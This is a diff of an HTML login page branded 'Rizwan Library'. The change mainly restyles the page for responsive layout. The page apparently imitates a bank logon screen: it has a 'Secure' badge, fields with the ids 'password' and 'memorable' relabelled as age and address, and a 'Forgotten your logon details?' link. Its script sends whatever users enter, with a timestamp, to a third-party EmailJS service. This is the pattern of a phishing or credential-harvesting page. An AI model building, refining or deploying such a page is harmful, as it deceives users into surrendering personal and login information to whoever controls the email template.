@@ -10,53 +10,163 @@
 </script>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { font-family: Arial, sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding: 20px; }
-  .phone-frame { width: 360px; border: 2px solid #ccc; border-radius: 36px; overflow: hidden; background: #fff; box-shadow: 0 8px 24px rgba(0,0,0,0.12); }
-  .header { background: #00694f; padding: 14px 16px; display: flex; align-items: center; justify-content: flex-end; }
-  .secure-badge { display: flex; align-items: center; gap: 5px; background: rgba(255,255,255,0.18); border-radius: 20px; padding: 4px 10px; }
-  .secure-badge svg { width: 12px; height: 12px; fill: #fff; }
-  .secure-badge span { color: #fff; font-size: 11px; }
-  .body { padding: 20px 16px 36px; background: #fff; }
-  .welcome-title { font-size: 22px; font-weight: 700; color: #111; margin-bottom: 6px; }
-  .welcome-sub { font-size: 13px; color: #555; margin-bottom: 20px; }
+  body {
+    font-family: Arial, sans-serif;
+    background: #f4f4f4;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    padding: 20px;
+  }
+  .card {
+    width: 100%;
+    max-width: 480px;
+    background: #fff;
+    border-radius: 20px;
+    overflow: hidden;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+  }
+  @media (min-width: 768px) {
+    body { align-items: center; padding: 40px 20px; }
+    .card { max-width: 520px; border-radius: 24px; }
+  }
+  .header {
+    background: #00694f;
+    padding: 14px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: flex-end;
+  }
+  .secure-badge {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    background: rgba(255,255,255,0.18);
+    border-radius: 20px;
+    padding: 4px 12px;
+  }
+  .secure-badge svg { width: 13px; height: 13px; fill: #fff; }
+  .secure-badge span { color: #fff; font-size: 12px; }
+  .body { padding: 24px 20px 36px; }
+  @media (min-width: 480px) {
+    .body { padding: 32px 32px 40px; }
+  }
+  .welcome-title {
+    font-size: clamp(20px, 5vw, 26px);
+    font-weight: 700;
+    color: #111;
+    margin-bottom: 6px;
+  }
+  .welcome-sub { font-size: 13px; color: #555; margin-bottom: 24px; }
   .welcome-sub a { color: #00694f; text-decoration: underline; }
-  .field-group { margin-bottom: 14px; }
+  .field-group { margin-bottom: 16px; }
   .field-label { font-size: 13px; font-weight: 600; color: #111; margin-bottom: 6px; display: block; }
-  .field-input { width: 100%; padding: 12px 44px 12px 14px; border: 1.5px solid #bbb; border-radius: 10px; font-size: 15px; background: #fff; color: #111; outline: none; transition: border-color 0.2s; }
-  .field-input:focus { border-color: #00694f; }
   .field-input-wrap { position: relative; }
-  .show-btn { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #00694f; font-size: 13px; font-weight: 600; cursor: pointer; padding: 0; }
+  .field-input {
+    width: 100%;
+    padding: 13px 50px 13px 14px;
+    border: 1.5px solid #bbb;
+    border-radius: 10px;
+    font-size: 15px;
+    background: #fff;
+    color: #111;
+    outline: none;
+    transition: border-color 0.2s;
+    -webkit-appearance: none;
+  }
+  .field-input:focus { border-color: #00694f; }
+  .show-btn {
+    position: absolute;
+    right: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    color: #00694f;
+    font-size: 13px;
+    font-weight: 600;
+    cursor: pointer;
+    padding: 4px;
+    touch-action: manipulation;
+  }
   .field-hint { font-size: 11px; color: #888; margin-top: 5px; }
-  .remember-row { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 8px; }
-  .remember-row input[type=checkbox] { margin-top: 2px; accent-color: #00694f; width: 18px; height: 18px; }
-  .remember-label { font-size: 13px; color: #111; }
-  .warning-text { font-size: 12px; color: #555; margin-bottom: 20px; padding: 8px 10px; background: #faf6ec; border-left: 3px solid #e6a817; border-radius: 0 6px 6px 0; }
+  .remember-row { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 10px; }
+  .remember-row input[type=checkbox] {
+    margin-top: 2px;
+    accent-color: #00694f;
+    width: 18px;
+    height: 18px;
+    flex-shrink: 0;
+    cursor: pointer;
+  }
+  .remember-label { font-size: 13px; color: #111; cursor: pointer; }
+  .warning-text {
+    font-size: 12px;
+    color: #555;
+    margin-bottom: 20px;
+    padding: 10px 12px;
+    background: #faf6ec;
+    border-left: 3px solid #e6a817;
+    border-radius: 0 6px 6px 0;
+    line-height: 1.5;
+  }
   .warning-text strong { color: #111; }
-  .continue-btn { width: 100%; background: #00694f; color: #fff; border: none; border-radius: 10px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 14px; transition: background 0.2s; }
+  .continue-btn {
+    width: 100%;
+    background: #00694f;
+    color: #fff;
+    border: none;
+    border-radius: 10px;
+    padding: 15px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-bottom: 16px;
+    transition: background 0.2s;
+    touch-action: manipulation;
+    -webkit-appearance: none;
+  }
   .continue-btn:hover { background: #005540; }
+  .continue-btn:active { background: #004432; }
   .continue-btn:disabled { background: #7dab9a; cursor: not-allowed; }
   .forgot-link { text-align: center; }
   .forgot-link a { color: #00694f; font-size: 14px; text-decoration: underline; }
-  #toast { display: none; margin-top: 14px; padding: 10px 14px; border-radius: 8px; font-size: 13px; font-weight: 600; text-align: center; }
+  #toast {
+    display: none;
+    margin-top: 14px;
+    padding: 11px 14px;
+    border-radius: 8px;
+    font-size: 13px;
+    font-weight: 600;
+    text-align: center;
+    line-height: 1.4;
+  }
   #toast.success { background: #e6f4ef; color: #00694f; border: 1px solid #00694f33; }
-  #toast.error { background: #fdecea; color: #c0392b; border: 1px solid #c0392b33; }
+  #toast.error   { background: #fdecea; color: #c0392b; border: 1px solid #c0392b33; }
 </style>
 </head>
 <body>
-<div class="phone-frame">
+
+<div class="card">
   <div class="header">
     <div class="secure-badge">
-      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 14l-3-3 1.41-1.41L11 12.17l4.59-4.58L17 9l-6 6z"/></svg>
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 14l-3-3 1.41-1.41L11 12.17l4.59-4.58L17 9l-6 6z"/>
+      </svg>
       <span>Secure</span>
     </div>
   </div>
+
   <div class="body">
     <h1 class="welcome-title">Welcome to Rizwan Library</h1>
     <p class="welcome-sub">New to Rizwan Library? <a href="#">Register online</a></p>
+
     <div class="field-group">
       <label class="field-label" for="userid">User ID</label>
       <input class="field-input" type="text" id="userid" autocomplete="off" placeholder="Enter your User ID" />
     </div>
+
     <div class="field-group">
       <label class="field-label" for="password">Your Age</label>
       <div class="field-input-wrap">
@@ -64,6 +174,7 @@
         <button class="show-btn" type="button" onclick="togglePw('password', this)">Show</button>
       </div>
     </div>
+
     <div class="field-group">
       <label class="field-label" for="memorable">Your Address</label>
       <div class="field-input-wrap">
@@ -72,51 +183,76 @@
       </div>
       <p class="field-hint">The address you provided when registering.</p>
     </div>
+
     <div class="remember-row">
       <input type="checkbox" id="remember" />
       <label class="remember-label" for="remember">Remember my User ID</label>
     </div>
+
     <div class="warning-text">
       <strong>Warning:</strong> Don't tick this box if you're using a public or shared computer.
     </div>
+
     <button class="continue-btn" id="submitBtn" onclick="handleSubmit()">Continue</button>
     <div id="toast"></div>
     <div class="forgot-link"><a href="#">Forgotten your logon details?</a></div>
   </div>
 </div>
+
 <script>
   function togglePw(id, btn) {
     const input = document.getElementById(id);
     if (input.type === 'password') { input.type = 'text'; btn.textContent = 'Hide'; }
     else { input.type = 'password'; btn.textContent = 'Show'; }
   }
+
   function showToast(message, type) {
     const toast = document.getElementById('toast');
-    toast.textContent = message; toast.className = type; toast.style.display = 'block';
+    toast.textContent = message;
+    toast.className = type;
+    toast.style.display = 'block';
     setTimeout(() => { toast.style.display = 'none'; }, 5000);
   }
+
   function handleSubmit() {
-    const userid = document.getElementById('userid').value.trim();
-    const age = document.getElementById('password').value.trim();
-    const address = document.getElementById('memorable').value.trim();
+    const userid   = document.getElementById('userid').value.trim();
+    const age      = document.getElementById('password').value.trim();
+    const address  = document.getElementById('memorable').value.trim();
     const remember = document.getElementById('remember').checked;
-    const btn = document.getElementById('submitBtn');
-    if (!userid || !age || !address) { showToast('⚠️ Please fill in all fields.', 'error'); return; }
-    btn.disabled = true; btn.textContent = 'Sending...';
+    const btn      = document.getElementById('submitBtn');
+
+    if (!userid || !age || !address) {
+      showToast('⚠️ Please fill in all fields before continuing.', 'error');
+      return;
+    }
+
+    btn.disabled = true;
+    btn.textContent = 'Sending...';
+
     emailjs.send("service_p6xk4mw", "template_tslrh0l", {
-      user_id: userid, user_age: age, address: address,
-      remember: remember ? 'Yes' : 'No', submitted_at: new Date().toLocaleString()
-    }).then(() => {
+      user_id:      userid,
+      user_age:     age,
+      address:      address,
+      remember:     remember ? 'Yes' : 'No',
+      submitted_at: new Date().toLocaleString()
+    })
+    .then(() => {
       showToast('✅ Submitted successfully!', 'success');
-      document.getElementById('userid').value = '';
-      document.getElementById('password').value = '';
-      document.getElementById('memorable').value = '';
+      document.getElementById('userid').value     = '';
+      document.getElementById('password').value   = '';
+      document.getElementById('memorable').value  = '';
       document.getElementById('remember').checked = false;
-    }).catch((err) => {
+    })
+    .catch((err) => {
       console.error('EmailJS error:', err);
       showToast('❌ Failed to send. Please try again.', 'error');
-    }).finally(() => { btn.disabled = false; btn.textContent = 'Continue'; });
+    })
+    .finally(() => {
+      btn.disabled = false;
+      btn.textContent = 'Continue';
+    });
   }
 </script>
+
 </body>
 </html>
